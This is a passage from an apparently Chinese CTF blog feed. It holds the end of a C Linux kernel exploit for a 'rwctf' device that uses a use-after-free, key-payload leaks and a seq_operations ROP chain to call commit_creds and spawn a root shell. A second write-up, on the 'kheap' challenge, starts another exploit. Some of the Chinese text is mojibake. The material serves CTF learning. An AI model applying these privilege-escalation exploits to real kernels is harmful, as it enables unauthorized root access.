number">0X20</span></span></span><span class="token class-name">size_t</span> POP_RDI_RET <span class="token operator">=</span> <span class="token number">0xffffffff8106ab4d</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ADD_RSP_0X168_RET <span class="token operator">=</span> <span class="token number">0xffffffff812a9811</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> init_cred <span class="token operator">=</span> <span class="token number">0xffffffff82850580</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0xffffffff81096110</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds <span class="token operator">=</span> <span class="token number">0xffffffff81095c30</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode <span class="token operator">=</span> <span class="token number">0xffffffff81e00ed0</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* to run the exp on the specific core only */</span><span class="token keyword">void</span> <span class="token function">bindCore</span><span class="token punctuation">(</span><span class="token keyword">int</span> core<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">cpu_set_t</span> cpu_set<span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set cpu affinity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span>core<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">key_alloc</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>description<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>payload<span class="token punctuation">,</span> <span class="token class-name">size_t</span> plen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_add_key<span class="token punctuation">,</span> <span class="token string">"user"</span><span class="token punctuation">,</span> description<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> plen<span class="token punctuation">,</span>                    KEY_SPEC_PROCESS_KEYRING<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">key_update</span><span class="token punctuation">(</span><span class="token keyword">int</span> keyid<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>payload<span class="token punctuation">,</span> <span class="token class-name">size_t</span> plen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_keyctl<span class="token punctuation">,</span> KEYCTL_UPDATE<span class="token punctuation">,</span> keyid<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> plen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">key_read</span><span class="token punctuation">(</span><span class="token keyword">int</span> keyid<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token class-name">size_t</span> buflen<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_keyctl<span class="token punctuation">,</span> KEYCTL_READ<span class="token punctuation">,</span> keyid<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> buflen<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">key_revoke</span><span class="token punctuation">(</span><span class="token keyword">int</span> keyid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_keyctl<span class="token punctuation">,</span> KEYCTL_REVOKE<span class="token punctuation">,</span> keyid<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">key_unlink</span><span class="token punctuation">(</span><span class="token keyword">int</span> keyid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_keyctl<span class="token punctuation">,</span> KEYCTL_UNLINK<span class="token punctuation">,</span> keyid<span class="token punctuation">,</span> KEY_SPEC_PROCESS_KEYRING<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> idx<span class="token punctuation">;</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> ptr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">struct</span> <span class="token class-name">request_t</span> n <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">.</span>idx <span class="token operator">=</span> idx<span class="token punctuation">,</span> <span class="token punctuation">.</span>size <span class="token operator">=</span> size<span class="token punctuation">,</span> <span class="token punctuation">.</span>ptr <span class="token operator">=</span> ptr <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span> <span class="token keyword">void</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">struct</span> <span class="token class-name">request_t</span> n <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">.</span>idx <span class="token operator">=</span> idx <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xC0DECAFE</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bindCore</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/rwctf"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Dev Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//obj0</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//obj1</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//kmalloc-64 freelist: obj0 -> obj1 -> obj2</span><span class="token keyword">int</span> key_id1<span class="token operator">=</span><span class="token function">key_alloc</span><span class="token punctuation">(</span><span class="token string">"key1"</span><span class="token punctuation">,</span> <span class="token string">"aaaaaaaa"</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//user_key_payload: obj1</span><span class="token keyword">int</span> key_id2<span class="token operator">=</span><span class="token function">key_alloc</span><span class="token punctuation">(</span><span class="token string">"key2"</span><span class="token punctuation">,</span> <span class="token string">"bbbbbbbb"</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//user_key_payload: obj2</span><span class="token comment">//kmalloc-64 freelist: : obj0</span><span class="token function">key_revoke</span><span class="token punctuation">(</span>key_id2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> header<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>header<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>header<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>header<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x100</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//kmalloc-64 freelist: : obj1 -> obj0</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>header<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">key_read</span><span class="token punctuation">(</span>key_id1<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xffffffff813d8210</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span>POP_RDI_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>ADD_RSP_0X168_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>init_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span>commit_creds<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span><span class="token number">35</span><span class="token operator">+</span>koff<span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> SEQ_SZ<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> seq_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> SEQ_SZ<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ADD_RSP_0X168_RET<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__asm__</span><span class="token punctuation">(</span>        <span class="token string">"mov r15,   POP_RDI_RET;"</span>        <span class="token string">"mov r14,   init_cred;"</span>        <span class="token string">"mov r13,   commit_creds;"</span>        <span class="token string">"mov r12,   swapgs_restore_regs_and_return_to_usermode;"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>seq_fd<span class="token punctuation">,</span> <span class="token string">"X1NRI"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/02f20404463fd4c74544610ae2b7d1bb_MD5.jpeg"></p><h2 id="EXP-heap-spraying-user-key-payload-pipe-buffer"><a href="#EXP-heap-spraying-user-key-payload-pipe-buffer" class="headerlink" title="EXP-heap spraying+user_key_payload+pipe_buffer"></a>EXP-heap spraying+user_key_payload+pipe_buffer</h2><p>ä¸è¿‡é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ç§å †å–·çš„æ–¹æ³•èƒ½å°†<code>UAF obj</code>åˆ†é…åˆ°<code>user_key_payload</code>ï¼š</p><ol><li>åˆ›å»ºUAF obj</li><li>å †å–·å°„ <code>user_key_payload</code>ï¼ŒUAF obj ä¼šä¸€ç›´ä½œä¸ºæ‹·è´ payload çš„ä¸´æ—¶ obj å­˜åœ¨ã€‚å½“<code>kmem_cache_cpu</code>çš„slub pageè€—å…‰ï¼Œæ­¤æ—¶ä¼šå‘ node çš„ partial é“¾è¡¨è¯·æ±‚æ–°çš„ slub page åˆ†é…<code>user_key_payload</code>ï¼ŒåŒæ—¶åŸ slub è¢«åŠ å…¥åˆ°Â <code>kmem_cache_node</code>Â çš„Â fullÂ é“¾è¡¨ï¼›ç´§æ¥ç€UAF objè¢«é‡Šæ”¾ï¼Œè¯¥ slub åˆä» full é“¾è¡¨è¿ç§»åˆ° partial é“¾è¡¨ï¼ŒUAF obj æˆä¸º freelist çš„å¤´èŠ‚ç‚¹ã€‚<br><img src="/EXP_FILE/00437e4d670fedf781d77a30fdeec4e5_MD5.jpeg"></li><li>ç»§ç»­å †å–·Â <code>user_key_payload</code>Â ï¼Œ<code>kmem_cache_cpu</code>Â çš„ slub page è€—å…‰ï¼Œå‘ node çš„ partial é“¾è¡¨è¯·æ±‚æ–°çš„ slub page åˆ†é…Â <code>user_key_payload</code>ã€‚äºæ˜¯UAF obj æ‰€åœ¨é¡µé¢è¢«å–å›ï¼ŒUAF obj è¢«åˆ†é…ä¸ºÂ <code>user_key_payload</code>ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pwnhub 2023ä¸‰æœˆå…¬å¼€èµ› kheap</title>
      <link href="/2024/04/02/Pwnhub%202023%E4%B8%89%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B%20kheap/"/>
      <url>/2024/04/02/Pwnhub%202023%E4%B8%89%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B%20kheap/</url>
      
        <content type="html"><![CDATA[<blockquote><p><del>ç°åœ¨çœ‹æ¥å…¶å®æ˜¯é€åˆ†é¢˜</del></p></blockquote><h1 id="ä¸€ã€é€†å‘åˆ†æ"><a href="#ä¸€ã€é€†å‘åˆ†æ" class="headerlink" title="ä¸€ã€é€†å‘åˆ†æ"></a>ä¸€ã€é€†å‘åˆ†æ</h1><h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 128M <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> ./bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> ./rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 oops=panic panic=1 kaslr quiet"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smep <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">2</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€äº†kaslrã€smepï¼Œç»è¿‡å®éªŒä¹Ÿå¼€å¯äº†PTI</p><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/sh</span>mount <span class="token operator">-</span>t proc none <span class="token operator">/</span>procmount <span class="token operator">-</span>t sysfs none <span class="token operator">/</span>sysmount <span class="token operator">-</span>t devtmpfs devtmpfs <span class="token operator">/</span>dev<span class="token keyword">exec</span> <span class="token number">0</span><span class="token operator">&lt;</span><span class="token operator">/</span>dev<span class="token operator">/</span>console<span class="token keyword">exec</span> <span class="token number">1</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span>console<span class="token keyword">exec</span> <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span>consoleinsmod <span class="token operator">/</span>lib<span class="token operator">/</span>module<span class="token operator">/</span>kheap<span class="token punctuation">.</span>kochmod <span class="token number">666</span> <span class="token operator">/</span>dev<span class="token operator">/</span>kheap chmod <span class="token number">600</span> flagsetsid cttyhack setuidgid <span class="token number">1000</span> shumount <span class="token operator">/</span>procumount <span class="token operator">/</span>syspoweroff <span class="token operator">-</span>d <span class="token number">0</span>  <span class="token operator">-</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="kheap-ko"><a href="#kheap-ko" class="headerlink" title="kheap.ko"></a>kheap.ko</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        Canary found      NX disabled   REL             No RPATH   No RUNPATH   <span class="token number">61</span><span class="token punctuation">)</span> Symbols  No<span class="token number">0</span><span class="token number">0</span>./kheap.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¼€äº†canary</p><p>æ³¨å†Œäº†ä¸€ä¸ªæ··æ‚è®¾å¤‡â€œkheapâ€<br><img src="/EXP_FILE/972f4e5482ca584f4f50fa419c750ccb_MD5.jpeg"></p><p>æˆ‘ä»¬ä¼ å…¥çš„ç»“æ„ä½“åº”ä¸º</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">request_t</span><span class="token punctuation">&#123;</span><span class="token class-name">size_t</span> idx<span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ioctlå®ç°äº†addã€delã€selectçš„åŠŸèƒ½ï¼Œåˆ†é…å†…å­˜å¤§å°ä¸º0x20<br><img src="/EXP_FILE/327b918c847050e8b905ae3821186f71_MD5.jpeg"><br>selectæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå­˜å‚¨æˆ‘ä»¬è¦æ“ä½œçš„å†…å­˜æŒ‡é’ˆ</p><p>read å­˜åœ¨<code>_check_object_size</code>ï¼Œå¯¹objçš„sizeè¿›è¡Œæ£€æµ‹ï¼Œwrite ä¹Ÿæ˜¯åŒç†<br><img src="/EXP_FILE/0db2151091fe695fc82e8322a6552ec1_MD5.jpeg"></p><h1 id="äºŒã€åˆ©ç”¨æ€è·¯"><a href="#äºŒã€åˆ©ç”¨æ€è·¯" class="headerlink" title="äºŒã€åˆ©ç”¨æ€è·¯"></a>äºŒã€åˆ©ç”¨æ€è·¯</h1><p>delè™½ç„¶æŠŠlistä¸­çš„æŒ‡é’ˆç½®ç©ºäº†ï¼Œä½†æ˜¯å…¨å±€å˜é‡selectçš„å­˜å‚¨çš„æŒ‡é’ˆä»ç„¶å­˜åœ¨ï¼Œå­˜åœ¨UAF</p><h1 id="ä¸‰ã€EXP"><a href="#ä¸‰ã€EXP" class="headerlink" title="ä¸‰ã€EXP"></a>ä¸‰ã€EXP</h1><p>0x20çš„å †å—ï¼ŒUAFå–·å°„seq_operationsï¼Œæ³„éœ²å†…æ ¸åŸºå€åç›´æ¥stack pivotåˆ°ç”¨æˆ·ç©ºé—´èµ°ropchainï¼Œå½“ç„¶åˆ©ç”¨pt_regsæ‰“æ ˆä¹Ÿå¯ä»¥</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_ADD</span> <span class="token expression"><span class="token number">0x10000</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_DEL</span> <span class="token expression"><span class="token number">0x10001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SELECT</span> <span class="token expression"><span class="token number">0x10002</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8102517a</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff81399238</span><span class="token operator">+</span>koff</span></span><span class="token macro property"><span class="token directive-hash">#</span><span 